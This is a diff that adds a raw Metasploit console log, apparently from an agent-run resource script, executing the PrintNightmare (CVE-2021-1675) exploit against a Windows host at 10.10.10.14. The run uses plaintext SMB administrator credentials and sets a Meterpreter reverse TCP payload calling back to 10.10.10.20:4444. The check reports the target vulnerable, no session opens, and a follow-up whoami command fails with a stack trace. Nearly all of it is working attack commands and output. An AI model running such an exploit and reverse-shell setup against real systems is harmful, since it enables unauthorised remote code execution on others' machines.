@@ -1,0 +1,48 @@
+[1m[34m[*][0m Processing /tmp/opencode/pn.rc for ERB directives.
+resource (/tmp/opencode/pn.rc)> use exploit/windows/dcerpc/cve_2021_1675_printnightmare
+[0m[1m[34m[*][0m No payload configured, defaulting to windows/meterpreter/reverse_tcp
+resource (/tmp/opencode/pn.rc)> set RHOSTS 10.10.10.14
+[0mRHOSTS => 10.10.10.14
+resource (/tmp/opencode/pn.rc)> set SMBUser Administrador
+[0mSMBUser => Administrador
+resource (/tmp/opencode/pn.rc)> set SMBPass password_2026
+[0mSMBPass => password_2026
+resource (/tmp/opencode/pn.rc)> set SRVHOST 10.10.10.20
+[0mSRVHOST => 10.10.10.20
+resource (/tmp/opencode/pn.rc)> set SRVPORT 445
+[0mSRVPORT => 445
+resource (/tmp/opencode/pn.rc)> set LHOST 10.10.10.20
+[0mLHOST => 10.10.10.20
+resource (/tmp/opencode/pn.rc)> set LPORT 4444
+[0mLPORT => 4444
+resource (/tmp/opencode/pn.rc)> set PAYLOAD windows/x64/meterpreter/reverse_tcp
+[0mPAYLOAD => windows/x64/meterpreter/reverse_tcp
+resource (/tmp/opencode/pn.rc)> set ExitOnSession false
+[0m[1m[33m[!][0m Unknown datastore option: ExitOnSession.
+ExitOnSession => false
+resource (/tmp/opencode/pn.rc)> run
+[0m[1m[34m[*][0m Started reverse TCP handler on 10.10.10.20:4444 
+[1m[34m[*][0m 10.10.10.14:445 - Running automatic check ("set AutoCheck false" to disable)
+[1m[34m[*][0m 10.10.10.14:445 - Target environment: Windows v10.0.14393 (x64)
+[1m[34m[*][0m 10.10.10.14:445 - Enumerating the installed printer drivers...
+[1m[34m[*][0m 10.10.10.14:445 - Retrieving the path of the printer driver directory...
+[1m[32m[+][0m 10.10.10.14:445 - The target is vulnerable. Received ERROR_BAD_NET_NAME, implying the target is vulnerable.
+[1m[34m[*][0m 10.10.10.14:445 - Server is running. Listening on 10.10.10.20:445
+[1m[34m[*][0m 10.10.10.14:445 - Server started.
+[1m[34m[*][0m 10.10.10.14:445 - The named pipe connection was broken, reconnecting...
+[1m[34m[*][0m 10.10.10.14:445 - Successfully reconnected to the named pipe.
+[1m[34m[*][0m Exploit completed, but no session was created.
+resource (/tmp/opencode/pn.rc)> sleep 20
+[0mresource (/tmp/opencode/pn.rc)> sessions -l
+[0m
+Active sessions
+===============
+
+No active sessions.
+
+resource (/tmp/opencode/pn.rc)> sessions -i 1 -C whoami
+[0m[1m[31m[-][0m Invalid session identifier: 1
+[1m[31m[-][0m Session manipulation failed: undefined method `type' for nil ["/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:1682:in `block (2 levels) in cmd_sessions'", "/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:1679:in `each'", "/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:1679:in `block in cmd_sessions'", "/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:1678:in `each'", "/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:1678:in `cmd_sessions'", "/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:582:in `run_command'", "/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:531:in `block in run_single'", "/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:525:in `each'", "/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:525:in `run_single'", "/usr/share/metasploit-framework/lib/rex/ui/text/resource.rb:69:in `load_resource'", "/usr/share/metasploit-framework/lib/msf/ui/console/driver.rb:196:in `block in initialize'", "/usr/share/metasploit-framework/lib/msf/ui/console/driver.rb:195:in `each'", "/usr/share/metasploit-framework/lib/msf/ui/console/driver.rb:195:in `initialize'", "/usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:66:in `new'", "/usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:66:in `driver'", "/usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:54:in `start'", "/usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'", "/usr/bin/msfconsole:23:in `<main>'"]
+resource (/tmp/opencode/pn.rc)> sleep 2
+[0mresource (/tmp/opencode/pn.rc)> exit
+[0m
